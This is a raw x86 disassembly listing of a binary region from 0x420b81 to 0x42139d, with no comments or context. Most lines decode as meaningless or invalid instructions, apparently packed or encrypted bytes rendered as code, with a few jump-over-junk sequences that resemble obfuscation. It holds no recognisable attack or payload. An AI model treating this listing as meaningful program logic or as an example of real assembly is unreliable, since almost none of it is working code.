  420b81:	test   eax,0x2ae80892
  420b86:	retf   
  420b87:	(bad)  
  420b88:	call   DWORD PTR [ebx]
  420b8a:	ror    DWORD PTR [ebx+0x3d83e445],0x50
  420b91:	cmc    
  420b92:	inc    edx
  420b93:	add    BYTE PTR [eax],al
  420b95:	jb     0x420bb0
  420b9b:	jmp    0x420bb0
  420ba0:	push   0x42f544
  420ba5:	push   0x8163
  420baa:	call   DWORD PTR ds:0x4387e4
  420bb0:	mov    ecx,DWORD PTR [ebp-0x10]
  420bb3:	mov    DWORD PTR [ebp-0x10],ecx
  420bb6:	jmp    0x420c84
  420bbb:	ins    DWORD PTR es:[edi],dx
  420bbc:	shr    BYTE PTR [eax+0x37],0xed
  420bc0:	mov    edi,0xa49dda7f
  420bc5:	pop    ecx
  420bc6:	pop    edi
  420bc7:	mov    al,0xe3
  420bc9:	mov    bh,0x65
  420bcb:	sar    DWORD PTR [esi+0x1],0x0
  420bcf:	mov    cl,0x0
  420bd1:	add    BYTE PTR [eax],al
  420bd3:	cmp    ah,ch
  420bd5:	sbb    BYTE PTR [esi-0x435d10c3],al
  420bdb:	(bad)  
  420bdc:	outs   dx,DWORD PTR ds:[esi]
  420bdd:	sahf   
  420bde:	fisttp WORD PTR [ebp-0x6c]
  420be1:	in     eax,0xc3
  420be3:	(bad)  [esi+ebx*4+0x38]
  420be7:	test   eax,0x568e18db
  420bec:	and    BYTE PTR [eax-0x72],bh
  420bef:	lahf   
  420bf0:	pop    ecx
  420bf1:	jne    0x420bd0
  420bf3:	(bad)  
  420bf4:	push   ds
  420bf5:	int3   
  420bf6:	xchg   DWORD PTR [ebx+eax*4],esp
  420bf9:	push   eax
  420bfa:	sti    
  420bfb:	mov    esp,0x3f9efd40
  420c00:	sbb    eax,0x28f958b
  420c05:	mov    eax,ds:0x51643760
  420c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c0b:	mov    gs,WORD PTR [esi]
  420c0d:	adc    BYTE PTR [ecx],cl
  420c0f:	(bad)  
  420c11:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  420c13:	gs or  dl,ch
  420c16:	add    cl,BYTE PTR [esi*8-0x77bedd03]
  420c1d:	sub    DWORD PTR [eax],ecx
  420c1f:	call   0x2831833b
  420c24:	push   ecx
  420c25:	fild   WORD PTR [edx+0x5c]
  420c28:	jae    0x420c68
  420c2a:	imul   edx,ebp,0x527a15be
  420c30:	sbb    ch,BYTE PTR ds:0x3498d21f
  420c36:	fwait
  420c37:	into   
  420c38:	and    cl,BYTE PTR [bx+0x26]
  420c3c:	pop    eax
  420c3d:	aam    0x63
  420c3f:	rol    esp,0x34
  420c42:	add    bh,dh
  420c44:	sti    
  420c45:	mov    ah,0xbd
  420c47:	ret    
  420c48:	add    eax,0xfffffff7
  420c4b:	xchg   ebx,eax
  420c4c:	or     al,0xab
  420c4e:	stos   BYTE PTR es:[edi],al
  420c4f:	xchg   esi,eax
  420c50:	xchg   BYTE PTR [eax+0x6434c2a6],ah
  420c56:	and    bl,BYTE PTR [esi+esi*4]
  420c59:	mov    al,ds:0x9d6635f8
  420c5e:	loope  0x420bea
  420c60:	ret    0x1292
  420c63:	shl    eax,0x64
  420c66:	push   eax
  420c67:	and    bh,dh
  420c69:	pop    ss
  420c6a:	dec    ebp
  420c6b:	mov    eax,ds:0x61107c7e
  420c70:	fisubr DWORD PTR [ecx+esi*4-0x1f]
  420c74:	stos   DWORD PTR es:[edi],eax
  420c75:	sahf   
  420c76:	in     al,dx
  420c77:	xchg   BYTE PTR [edi],al
  420c79:	or     ax,0xe676
  420c7d:	out    0xdd,eax
  420c7f:	pop    esi
  420c80:	mov    bh,0x49
  420c82:	and    DWORD PTR [ebp+0x7511888d],ebp
  420c88:	add    BYTE PTR [eax],al
  420c8a:	mov    DWORD PTR [ebp-0x1c],eax
  420c8d:	jmp    0x420d5b
  420c92:	call   0xf00879a1
  420c97:	out    0xeb,eax
  420c99:	cs sti 
  420c9b:	inc    ebp
  420c9c:	ror    ebp,cl
  420c9e:	jecxz  0x420c47
  420ca0:	xor    dh,BYTE PTR [ebx]
  420ca2:	jb     0x420d23
  420ca4:	add    DWORD PTR [eax],eax
  420ca6:	mov    cl,0x0
  420ca8:	add    BYTE PTR [eax],al
  420caa:	mov    ch,0x4b
  420cac:	rol    ch,1
  420cae:	mov    BYTE PTR [eax-0x65],ch
  420cb1:	add    ebx,DWORD PTR [edx-0x57e32a7d]
  420cb7:	popa   
  420cb8:	ret    0xa7a4
  420cbb:	and    BYTE PTR [edx+0x19cd88a7],0x2d
  420cc2:	stos   DWORD PTR es:[edi],eax
  420cc3:	shl    eax,cl
  420cc5:	push   ecx
  420cc6:	mov    dl,0xb3
  420cc8:	(bad)  
  420cc9:	add    DWORD PTR [ecx+ebp*4],edx
  420ccc:	out    0xdd,al
  420cce:	loopne 0x420cc6
  420cd0:	and    DWORD PTR [ecx],ecx
  420cd2:	mov    eax,ds:0x7db19918
  420cd7:	iret   
  420cd8:	cs stos DWORD PTR es:[edi],eax
  420cda:	es in  al,dx
  420cdc:	(bad)  
  420cdf:	xchg   ebp,eax
  420ce0:	fwait
  420ce1:	ss push ss
  420ce3:	xchg   ebx,eax
  420ce4:	repnz dec ebp
  420ce6:	pop    esi
  420ce7:	or     DWORD PTR [ebp-0x43],esi
  420cea:	cwde   
  420ceb:	dec    ebp
  420cec:	jle    0x420cd8
  420cee:	lods   al,BYTE PTR ds:[esi]
  420cef:	test   eax,0x3796ae66
  420cf4:	ja     0x420c94
  420cf6:	and    ch,cl
  420cf8:	ins    DWORD PTR es:[edi],dx
  420cf9:	add    bl,ch
  420cfb:	cld    
  420cfc:	mov    dh,0xe2
  420cfe:	call   0xbd92:0x7c643604
  420d05:	cmp    ebp,DWORD PTR [esi+0xa11d21a]
  420d0b:	aaa    
  420d0c:	mov    edx,0xfbd0876b
  420d11:	and    DWORD PTR [edi],eax
  420d13:	or     BYTE PTR [esi+0x4a],dl
  420d16:	xchg   esp,eax
  420d17:	inc    ecx
  420d18:	lods   al,BYTE PTR ds:[esi]
  420d19:	add    al,0xd8
  420d1b:	dec    ebp
  420d1c:	push   ss
  420d1d:	test   eax,0xb7bb0e35
  420d22:	cmp    eax,0xb08034a9
  420d27:	add    eax,DWORD PTR [edx+0x2bde9777]
  420d2d:	adc    BYTE PTR [edx-0x9],bl
  420d30:	lea    esi,[ebx]
  420d32:	xchg   esi,eax
  420d33:	sbb    DWORD PTR [ecx-0x36],esi
  420d36:	shl    BYTE PTR [eax],0xe6
  420d39:	mov    eax,0xfbb1bb2b
  420d3e:	add    edx,DWORD PTR [eax]
  420d40:	icebp  
  420d41:	dec    ebp
  420d42:	ins    BYTE PTR es:[edi],dx
  420d43:	or     eax,DWORD PTR [edi]
  420d45:	in     al,0xe1
  420d47:	xchg   BYTE PTR [eax+0x2a],cl
  420d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d4b:	cmp    eax,0x3fcc45b5
  420d50:	inc    eax
  420d51:	push   ebx
  420d52:	jle    0x420cdf
  420d54:	rcl    bh,1
  420d56:	sub    al,0xf
  420d58:	loopne 0x420cfc
  420d5a:	xor    al,0xc1
  420d5c:	loope  0x420d6e
  420d5e:	jmp    0x420e2c
  420d63:	sub    al,0x4e
  420d65:	adc    BYTE PTR [edx+esi*2+0x7e],ch
  420d69:	jl     0x420db9
  420d6b:	cmp    al,0x9c
  420d6d:	push   0xed58c19f
  420d72:	mov    esp,0x18023
  420d77:	mov    cl,0x0
  420d79:	add    BYTE PTR [eax],al
  420d7b:	cmc    
  420d7c:	ret    0x6732
  420d7f:	xchg   edi,eax
  420d80:	or     al,0xc3
  420d82:	les    edx,FWORD PTR [eax+0x2c]
  420d85:	add    eax,0x643ad14e
  420d8a:	vmwrite ecx,DWORD PTR [edi]
  420d8d:	inc    edi
  420d8e:	and    esp,0x329e2f6b
  420d94:	in     eax,0x41
  420d96:	in     al,dx
  420d97:	(bad)  
  420d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d9a:	in     al,0xc0
  420d9c:	(bad)  
  420d9d:	or     esi,DWORD PTR [ecx]
  420d9f:	adc    BYTE PTR [ebp-0x11],dl
  420da2:	mov    ebp,0xda36ecd2
  420da7:	dec    ebp
  420da8:	out    0xde,al
  420daa:	rcr    esi,0x1
  420dad:	jbe    0x420db1
  420daf:	lods   eax,DWORD PTR ds:[esi]
  420db0:	cld    
  420db1:	or     ebx,esp
  420db3:	pop    ss
  420db4:	jno    0x420d5c
  420db6:	jg     0x420dc6
  420db8:	adc    al,0xc7
  420dba:	shl    BYTE PTR [esi-0x5099a43a],0x89
  420dc1:	push   ss
  420dc2:	(bad)  
  420dc3:	xor    eax,0xad5906b4
  420dc8:	shl    BYTE PTR [ebp+0x7c],cl
  420dcb:	sti    
  420dcc:	xchg   esp,edx
  420dce:	and    DWORD PTR [edi],edx
  420dd0:	loop   0x420dd1
  420dd2:	das    
  420dd3:	test   al,0x7d
  420dd5:	es hlt 
  420dd7:	cli    
  420dd8:	mov    edi,0x7e535e8d
  420ddd:	pushf  
  420dde:	test   esi,ebx
  420de0:	mov    bh,0xbf
  420de2:	xchg   ebx,eax
  420de3:	push   cs
  420de4:	sbb    bh,BYTE PTR [eax-0x4fe9e9a8]
  420dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420deb:	popf   
  420dec:	cli    
  420ded:	je     0x420e5c
  420def:	neg    DWORD PTR [ebx+0x8]
  420df2:	xchg   edi,eax
  420df3:	push   edi
  420df4:	pop    ss
  420df5:	sub    ebx,DWORD PTR [esp+esi*8+0xd]
  420df9:	jbe    0x420dd8
  420dfb:	xchg   ecx,eax
  420dfc:	mov    ch,0xc7
  420dfe:	sub    eax,0xb913443e
  420e03:	popf   
  420e04:	sbb    cl,dh
  420e06:	js     0x420e3e
  420e08:	pop    DWORD PTR [ecx]
  420e0a:	xchg   BYTE PTR [edx+0x2a8bb42c],cl
  420e10:	lahf   
  420e11:	mov    edx,eax
  420e13:	cs xchg ebp,eax
  420e15:	aad    0x7
  420e17:	ret    
  420e18:	adc    al,bh
  420e1a:	dec    esp
  420e1b:	sbb    al,0xe3
  420e1d:	cs mov cl,0xac
  420e20:	and    ch,BYTE PTR [ebx-0x56]
  420e23:	mov    dl,bh
  420e25:	inc    ebp
  420e26:	sbb    DWORD PTR [ecx],edx
  420e28:	es sbb al,0xa2
  420e2b:	fwait
  420e2c:	add    eax,0x3cf87511
  420e31:	jmp    0x420eff
  420e36:	(bad)  
  420e37:	mov    cl,BYTE PTR [ebp-0x34]
  420e3a:	pop    ebp
  420e3b:	iret   
  420e3c:	xlat   BYTE PTR ds:[ebx]
  420e3d:	call   0x88d7:0xa101bc1a
  420e44:	push   esi
  420e45:	lahf   
  420e46:	aam    0x80
  420e48:	add    DWORD PTR [eax],eax
  420e4a:	mov    cl,0x0
  420e4c:	add    BYTE PTR [eax],al
  420e4e:	or     BYTE PTR ds:[ecx+0x110c0f19],al
  420e55:	jb     0x420ea6
  420e57:	xchg   esi,eax
  420e58:	or     al,0xa5
  420e5a:	jno    0x420e09
  420e5c:	jmp    0xd76c:0x2c3ca4f9
  420e63:	sbb    eax,0xd857fd34
  420e68:	aam    0xe2
  420e6a:	pop    ebp
  420e6b:	inc    ebx
  420e6c:	sub    DWORD PTR [esi],edi
  420e6e:	fcmovne st,st(5)
  420e70:	mov    DWORD PTR [eax+0x4d923491],edi
  420e76:	xor    bl,BYTE PTR [eax-0x3233e701]
  420e7c:	imul   ebx,DWORD PTR [ebp+0x64b64cec],0x56
  420e83:	push   ebx
  420e84:	retf   0x5400
  420e87:	rcl    DWORD PTR [esi+0x2fa4522e],cl
  420e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e8e:	dec    eax
  420e8f:	xchg   esp,eax
  420e90:	mov    ebx,ebx
  420e92:	mov    dl,0x88
  420e94:	add    BYTE PTR [ebx-0x5538238d],al
  420e9a:	mov    dl,0xd4
  420e9c:	sub    ebx,DWORD PTR [esi]
  420e9e:	sub    edi,ecx
  420ea0:	test   eax,0xb809c38a
  420ea5:	fcomp  st(2)
  420ea7:	fnstenv [ecx+0x19d60d19]
  420ead:	dec    edi
  420eae:	and    ebx,DWORD PTR [ebx+0x2efd691f]
  420eb4:	pop    ebx
  420eb5:	repz pop ss
  420eb7:	push   edx
  420eb8:	sbb    ebx,DWORD PTR [ebx]
  420eba:	and    ebx,DWORD PTR [edi-0x366312db]
  420ec0:	mov    ah,0x61
  420ec2:	lahf   
  420ec3:	or     al,0xae
  420ec5:	in     eax,dx
  420ec6:	mov    eax,0x13e82cb2
  420ecb:	lahf   
  420ecc:	xchg   BYTE PTR [eax+ebx*1-0x10055be2],bh
  420ed3:	cs out dx,eax
  420ed5:	stc    
  420ed6:	cmp    eax,0xea0174dc
  420edb:	jmp    DWORD PTR [esi-0x1b]
  420edf:	mov    bl,0x53
  420ee1:	mov    WORD PTR ds:0x1e6ebbc8,ss
  420ee7:	inc    edx
  420ee8:	jno    0x420f08
  420eea:	fisubr DWORD PTR [edi+0x4d5917b8]
  420ef0:	sbb    ebx,DWORD PTR [esi-0x56]
  420ef3:	leave  
  420ef4:	shr    esp,0xf2
  420ef7:	mov    al,ds:0x97ef7d94
  420efc:	jmp    0x8110:0xe8c131fd
  420f03:	xor    eax,0x42f5c0
  420f08:	inc    eax
  420f09:	test   BYTE PTR [edx+0x0],0xb
  420f0d:	enter  0xf181,0xc9
  420f11:	pop    ecx
  420f12:	loop   0x420f8c
  420f14:	add    DWORD PTR ds:0x42f644,0x14b0
  420f1e:	add    ecx,ebx
  420f20:	mov    DWORD PTR ds:0x42f550,0x21d1
  420f2a:	jmp    0x420ff8
  420f2f:	xchg   esi,eax
  420f30:	in     al,0x5e
  420f32:	addr16 jle 0x420f34
  420f35:	mov    edi,0x2074f8f5
  420f3a:	dec    esi
  420f3b:	push   edi
  420f3c:	jmp    0x81c71d14
  420f41:	add    DWORD PTR [eax],eax
  420f43:	mov    cl,0x0
  420f45:	add    BYTE PTR [eax],al
  420f47:	mov    al,ds:0x5c9b577c
  420f4c:	push   ds
  420f4d:	popf   
  420f4e:	cli    
  420f4f:	push   ebp
  420f50:	or     dh,BYTE PTR [edx+0x37ddb39e]
  420f56:	fldenv [ebx+0x71]
  420f59:	sar    BYTE PTR [ebx],1
  420f5b:	idiv   BYTE PTR [eax-0x4b44ac8b]
  420f61:	sti    
  420f62:	pop    esi
  420f63:	int    0x9
  420f65:	add    eax,0x35ffaefc
  420f6a:	(bad)  
  420f6b:	pop    edi
  420f6c:	in     eax,dx
  420f6d:	add    BYTE PTR [edx-0x184d70],0x24
  420f74:	jns    0x420f93
  420f76:	mov    ds:0x3df75c,al
  420f7b:	jp     0x420f1c
  420f7d:	ja     0x420fe6
  420f7f:	push   ds
  420f80:	inc    eax
  420f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f82:	inc    ebp
  420f83:	std    
  420f84:	push   es
  420f85:	les    ebx,FWORD PTR [edi+0x432c1afa]
  420f8b:	repz in al,0x7c
  420f8e:	stos   BYTE PTR es:[edi],al
  420f8f:	or     BYTE PTR [esi+0x61],dh
  420f92:	call   0x61bd3f67
  420f97:	imul   ebx,DWORD PTR [ebx+0x15cb7a63],0x5ef4f22a
  420fa1:	loope  0x420f78
  420fa3:	xchg   ecx,eax
  420fa4:	(bad)  
  420fa5:	enter  0x22b,0x3f
  420fa9:	or     al,al
  420fab:	js     0x420f67
  420fad:	dec    esi
  420fae:	in     al,0xe4
  420fb0:	and    al,0xdc
  420fb2:	xor    ecx,esi
  420fb4:	mov    al,ds:0xbc74080a
  420fb9:	daa    
  420fba:	(bad)  
  420fbb:	xor    esi,edx
  420fbd:	xchg   ebx,eax
  420fbe:	xchg   sp,ax
  420fc0:	dec    edx
  420fc1:	xor    edi,DWORD PTR ds:0x3e721ab2
  420fc7:	and    eax,edx
  420fc9:	shr    ah,cl
  420fcb:	ins    BYTE PTR es:[edi],dx
  420fcc:	push   ss
  420fcd:	push   edi
  420fce:	(bad)  
  420fcf:	fwait
  420fd0:	jmp    0x4f5c2201
  420fd5:	test   al,0x1a
  420fd7:	jns    0x420f7c
  420fd9:	sbb    DWORD PTR [eax+0x741ed3ec],0x634fd885
  420fe3:	in     eax,0x5a
  420fe5:	inc    edi
  420fe6:	imul   DWORD PTR [edx+0x4c1f6c22]
  420fec:	leave  
  420fed:	pop    edx
  420fee:	in     eax,dx
  420fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ff0:	leave  
  420ff1:	jmp    0xffde:0xabc12c65
  420ff8:	cmp    ecx,0x4aebda42
  420ffe:	mov    DWORD PTR ds:0x42f5b0,0x758f
  421008:	jmp    0x4210d6
  42100d:	lahf   
  42100e:	sbb    dh,BYTE PTR [esi-0x20014802]
  421014:	jnp    0x421020
  421016:	jbe    0x42103c
  421018:	fisubr DWORD PTR [esi+0x18]
  42101b:	and    eax,0x1823602
  421020:	add    BYTE PTR [ecx+0x6a000000],dh
  421026:	sbb    ebp,edi
  421028:	shl    DWORD PTR [edi-0xa],cl
  42102b:	mov    al,0xd0
  42102d:	push   esp
  42102e:	lahf   
  42102f:	icebp  
  421030:	xor    dl,bh
  421032:	jae    0x420fce
  421034:	stc    
  421035:	adc    DWORD PTR [eax+0x7b],esi
  421038:	dec    eax
  421039:	push   es
  42103a:	jmp    FWORD PTR [ecx+0x7b87f472]
  421040:	push   ebx
  421041:	test   BYTE PTR [ecx-0x211993b5],al
  421047:	pop    es
  421048:	loope  0x42105f
  42104a:	and    ecx,DWORD PTR [ebx]
  42104c:	sti    
  42104d:	xor    eax,0xc2cf825f
  421052:	cmp    BYTE PTR [edi],al
  421054:	xchg   edi,eax
  421055:	out    0x92,al
  421057:	push   cs
  421058:	(bad)  
  421059:	sub    al,BYTE PTR [ecx+edi*2-0x402107cc]
  421060:	aad    0xae
  421062:	into   
  421063:	jb     0x42101d
  421065:	mov    dh,0xd9
  421067:	lds    esi,FWORD PTR [ebx-0x62f7bdc9]
  42106d:	vpandn ymm7,ymm3,YMMWORD PTR cs:[edi+0x10]
  421074:	mov    al,0x6f
  421076:	push   dx
  421078:	xor    eax,0xa76a3b30
  42107d:	jmp    0x42102f
  42107f:	(bad)  
  421080:	in     al,0xd6
  421082:	cs add eax,0x6d0d79ba
  421088:	aaa    
  421089:	mov    ds:0x684ef8c4,al
  42108e:	push   esi
  42108f:	mov    dl,0x27
  421091:	(bad)  [eax-0x45c20710]
  421097:	push   edx
  421098:	cdq    
  421099:	mov    al,ds:0xa1620c41
  42109e:	dec    ebx
  42109f:	push   eax
  4210a0:	icebp  
  4210a1:	push   es
  4210a2:	mov    eax,ds:0xe8e26929
  4210a7:	aad    0x11
  4210a9:	dec    ebp
  4210aa:	fistp  QWORD PTR [ebp+0xd]
  4210ad:	push   esp
  4210ae:	add    al,0x66
  4210b0:	int3   
  4210b1:	add    esi,DWORD PTR [ecx]
  4210b3:	fcmovbe st,st(1)
  4210b5:	or     eax,0x174a8001
  4210ba:	mov    WORD PTR [ebp+0x6a],ss
  4210bd:	mov    esp,0x9e66e565
  4210c2:	out    0xe8,al
  4210c4:	mov    ds,WORD PTR [ecx]
  4210c6:	xchg   bl,ah
  4210c8:	sbb    edx,DWORD PTR [edx-0x16]
  4210cb:	shl    DWORD PTR [ecx],cl
  4210cd:	or     BYTE PTR [ebx-0x19a92205],bh
  4210d3:	mov    WORD PTR [edx+edx*2+0xf],fs
  4210d7:	test   dl,dh
  4210d9:	sub    eax,DWORD PTR [eax]
  4210db:	add    BYTE PTR [ebx+0x2581f045],cl
  4210e1:	xor    ch,0x42
  4210e4:	add    BYTE PTR [esi],ch
  4210e6:	add    BYTE PTR [bx+si],al
  4210e9:	jmp    0x4211b7
  4210ee:	mov    WORD PTR [ebx+esi*4-0x36],?
  4210f2:	repz iret 
  4210f4:	std    
  4210f5:	jle    0x4210f8
  4210f7:	dec    edi
  4210f8:	and    BYTE PTR [edx-0x326fa549],dl
  4210fe:	out    0x82,eax
  421100:	add    DWORD PTR [eax],eax
  421102:	mov    cl,0x0
  421104:	add    BYTE PTR [eax],al
  421106:	test   DWORD PTR [esi+0xa0cffd1],ebx
  42110c:	push   ebp
  42110d:	xor    BYTE PTR [esp+ebp*4],0x48
  421111:	rcl    DWORD PTR [edi],cl
  421113:	ret    0x5844
  421116:	jg     0x4210c9
  421118:	dec    edx
  421119:	and    esp,esi
  42111b:	pop    esp
  42111c:	inc    edx
  42111d:	inc    ebp
  42111e:	jmp    0x9f35:0xe906c678
  421125:	add    dh,BYTE PTR es:[edx+0x65073485]
  42112c:	aas    
  42112d:	ficom  WORD PTR [eax+0x16d245a2]
  421133:	loopne 0x421118
  421135:	xchg   edx,ecx
  421137:	jo     0x42111f
  421139:	xchg   ebp,eax
  42113a:	and    eax,0x9aade535
  42113f:	aaa    
  421140:	jmp    0x6f09:0xe10b0109
  421147:	shl    dh,0x22
  42114a:	mov    ebp,0x4936cb7a
  42114f:	and    al,BYTE PTR [edx]
  421151:	in     eax,dx
  421152:	cmp    BYTE PTR [ecx+0x41],ah
  421155:	xchg   esi,eax
  421156:	cmp    DWORD PTR [ebx],eax
  421158:	pop    eax
  421159:	mov    dl,0xed
  42115b:	xor    edx,DWORD PTR [ebp+0x10d67e54]
  421161:	(bad)  
  421162:	fidivr WORD PTR [esi-0x230258b6]
  421168:	div    esi
  42116a:	ror    BYTE PTR [eax-0x3f],1
  42116d:	nop
  42116e:	lock push ss
  421170:	in     al,dx
  421171:	jns    0x421168
  421173:	push   edx
  421174:	aad    0xd
  421176:	dec    eax
  421178:	xor    al,ah
  42117a:	out    dx,al
  42117b:	jg     0x42114e
  42117d:	jg     0x4211e1
  42117f:	pop    es
  421180:	sbb    al,BYTE PTR [edx-0x4a3ba6e1]
  421186:	sti    
  421187:	ficom  WORD PTR [eax]
  421189:	jnp    0x4211eb
  42118b:	and    eax,DWORD PTR [edi-0x3e29890]
  421191:	or     al,bl
  421193:	or     DWORD PTR [ebx-0x36],esp
  421196:	mov    edx,0x500402aa
  42119b:	aaa    
  42119c:	outs   dx,BYTE PTR ds:[esi]
  42119d:	clc    
  42119e:	fsubr  QWORD PTR [edi-0x4f]
  4211a1:	icebp  
  4211a2:	cld    
  4211a3:	adc    eax,0x758ee46e
  4211a8:	loop   0x421181
  4211aa:	xor    al,BYTE PTR [ebp+0x3cc233d9]
  4211b0:	ret    
  4211b1:	cs inc edi
  4211b3:	xchg   esp,eax
  4211b4:	in     eax,dx
  4211b5:	cmp    edi,DWORD PTR [ecx]
  4211b7:	mov    DWORD PTR [ebp-0x14],0x3b78
  4211be:	cmp    DWORD PTR ds:0x42f610,0x0
  4211c5:	ja     0x4212c2
  4211cb:	jmp    0x4212c2
  4211d0:	push   0x7185
  4211d5:	push   DWORD PTR [ebp-0x18]
  4211d8:	push   0x42a573
  4211dd:	push   0x3b09
  4211e2:	push   DWORD PTR [ebp-0x10]
  4211e5:	push   DWORD PTR [ebp-0x28]
  4211e8:	push   DWORD PTR [ebp-0x28]
  4211eb:	push   DWORD PTR [ebp-0xc]
  4211ee:	call   DWORD PTR ds:0x438810
  4211f4:	jmp    0x4212c2
  4211f9:	mov    al,ds:0xfb52d1da
  4211fe:	pop    ebx
  4211ff:	mov    ds:0xb11598fa,eax
  421204:	in     al,0x4c
  421206:	and    al,0xd8
  421208:	xor    ebx,DWORD PTR [eax-0x4efffe7d]
  42120e:	add    BYTE PTR [eax],al
  421210:	add    BYTE PTR [edx-0x21],cl
  421213:	jle    0x421229
  421215:	outs   dx,DWORD PTR ds:[esi]
  421216:	shl    DWORD PTR [ebp+0x4c3aaffa],1
  42121c:	mov    al,ds:0x40a442d0
  421221:	lds    esp,FWORD PTR [eax-0x5da258f8]
  421227:	shl    DWORD PTR [ebx-0x7f43fd77],0x46
  42122e:	or     BYTE PTR [esi+0x2d],al
  421231:	arpl   WORD PTR [ebp-0x53],di
  421234:	std    
  421235:	into   
  421236:	lock jl 0x421261
  421239:	push   ebp
  42123a:	iret   
  42123b:	daa    
  42123c:	or     DWORD PTR [edx],eax
  42123e:	mov    edi,DWORD PTR [edx]
  421240:	mov    ecx,0x674ba00
  421245:	mov    al,0xd5
  421247:	into   
  421248:	std    
  421249:	or     DWORD PTR [ebx+eax*2-0x22],ecx
  42124d:	cdq    
  42124e:	dec    esp
  42124f:	push   esp
  421250:	or     eax,0x45127b44
  421255:	cmp    DWORD PTR [ebp-0x79],ebx
  421258:	daa    
  421259:	inc    edi
  42125a:	mov    ds:0xc1e72f7,eax
  42125f:	(bad)  
  421260:	stc    
  421261:	retf   
  421262:	aam    0x16
  421264:	(bad)  
  421267:	mov    bh,0xd6
  421269:	out    0x6f,eax
  42126b:	adc    ch,BYTE PTR [ecx+0x6b66cc75]
  421271:	mov    edi,0x998f1f57
  421276:	bound  eax,QWORD PTR [edi+0x32]
  421279:	sbb    al,0xb7
  42127b:	shl    BYTE PTR [esi-0x3f8a73c6],1
  421281:	push   es
  421282:	ficom  WORD PTR [ebx-0x24]
  421285:	scas   al,BYTE PTR es:[edi]
  421286:	sar    BYTE PTR [edx+0x7d],1
  421289:	retf   0xf72c
  42128c:	add    DWORD PTR [ebx-0x4be09d95],esp
  421292:	adc    esi,ebp
  421294:	pusha  
  421295:	push   cs
  421296:	stc    
  421297:	outs   dx,BYTE PTR ds:[esi]
  421298:	jle    0x4212ba
  42129a:	int3   
  42129b:	push   ss
  42129c:	ja     0x421264
  42129e:	not    ecx
  4212a0:	retf   0x2f55
  4212a3:	fwait
  4212a4:	push   es
  4212a5:	xchg   ebp,eax
  4212a6:	(bad)  
  4212a7:	mov    al,0xa7
  4212a9:	out    0xab,al
  4212ab:	adc    DWORD PTR [ebp+0x18],edx
  4212ae:	add    DWORD PTR [edi],0x49
  4212b1:	sbb    edx,DWORD PTR [esi+0x328181f]
  4212b7:	xchg   esp,eax
  4212b8:	mov    ah,0x94
  4212ba:	in     eax,0x8a
  4212bc:	inc    ebx
  4212bd:	fwait
  4212be:	lahf   
  4212bf:	sbb    bl,BYTE PTR [ebx]
  4212c1:	cmp    BYTE PTR [ecx+0x45c7d045],cl
  4212c7:	lock dec ebx
  4212c9:	or     al,BYTE PTR [eax]
  4212cb:	add    BYTE PTR [ebx-0x36160fbb],cl
  4212d1:	add    BYTE PTR [eax],al
  4212d3:	add    ah,dh
  4212d5:	int3   
  4212d6:	stc    
  4212d7:	retf   
  4212d8:	stc    
  4212d9:	push   esi
  4212db:	(bad)  
  4212dc:	jns    0x421338
  4212de:	dec    esi
  4212df:	xor    edx,DWORD PTR [eax-0x49]
  4212e2:	jecxz  0x42131d
  4212e4:	dec    ecx
  4212e5:	test   BYTE PTR [ecx],al
  4212e7:	add    BYTE PTR [ecx+0x79000000],dh
  4212ed:	adc    BYTE PTR [edx+0x7e7bd19e],dh
  4212f3:	repnz sub DWORD PTR [ecx+0x78d1cfa1],esp
  4212fa:	inc    ebx
  4212fb:	mov    al,ds:0x6b7c2022
  421300:	leave  
  421301:	or     BYTE PTR [edx+0x8],ch
  421304:	inc    esp
  421305:	lods   al,BYTE PTR ds:[esi]
  421306:	fwait
  421307:	imul   ebx,DWORD PTR [edx-0x22],0x12c6d53c
  42130e:	adc    eax,DWORD PTR [edx+0x14bd974e]
  421314:	or     eax,0x7a241709
  421319:	fsub   DWORD PTR [ecx-0x1]
  42131c:	repnz repz and esp,DWORD PTR [ebp-0xcb05b5f]
  421324:	cmp    BYTE PTR [edi],bl
  421326:	add    dh,BYTE PTR [edi+0x6d]
  421329:	mov    ds:0xd1baed05,al
  42132e:	dec    edx
  42132f:	lds    ebx,FWORD PTR [ebx+edi*1+0xf]
  421333:	jb     0x42139a
  421335:	mov    BYTE PTR [edi+0x7a26e036],bl
  42133b:	stos   BYTE PTR es:[edi],al
  42133c:	shr    DWORD PTR [eax+0x20],cl
  42133f:	dec    edx
  421340:	pop    ss
  421341:	retf   0xbf2
  421344:	push   0x33
  421346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421347:	outs   dx,DWORD PTR ds:[esi]
  421348:	pushf  
  421349:	pop    eax
  42134a:	rcr    esi,0x4
  42134d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42134e:	sub    edi,DWORD PTR [ebx]
  421350:	repz inc esi
  421352:	xor    ebp,DWORD PTR [ecx-0x57]
  421355:	adc    al,0x49
  421357:	xor    bh,bh
  421359:	ja     0x4213b4
  42135b:	js     0x421362
  42135d:	dec    esi
  42135e:	push   ss
  42135f:	xor    dx,WORD PTR [eax-0x4f46118e]
  421366:	popa   
  421367:	xor    BYTE PTR [ebp+0x29],dh
  42136a:	jo     0x42139f
  42136c:	mov    ds:0x212bb3e8,eax
  421371:	push   esi
  421372:	ret    0x482e
  421375:	popf   
  421376:	xlat   BYTE PTR ds:[ebx]
  421377:	dec    ebx
  421378:	or     ah,dh
  42137a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42137b:	mov    dl,0x73
  42137d:	add    al,BYTE PTR [ebx+0xe2e9b53]
  421383:	inc    ecx
  421384:	inc    esi
  421385:	cld    
  421386:	(bad)  
  421387:	jno    0x421356
  421389:	lods   al,BYTE PTR ds:[esi]
  42138a:	js     0x421313
  42138c:	mov    bl,0x9b
  42138e:	bswap  ebp
  421390:	in     eax,0xe0
  421392:	ror    BYTE PTR [edx],1
  421394:	push   cs
  421395:	or     bh,BYTE PTR [ebx+0x9]
  421398:	iret   
  421399:	pop    eax
  42139a:	adc    BYTE PTR [ecx+0x5b],bh
  42139d:	mov    ecx,DWORD PTR [ebp-0x14]
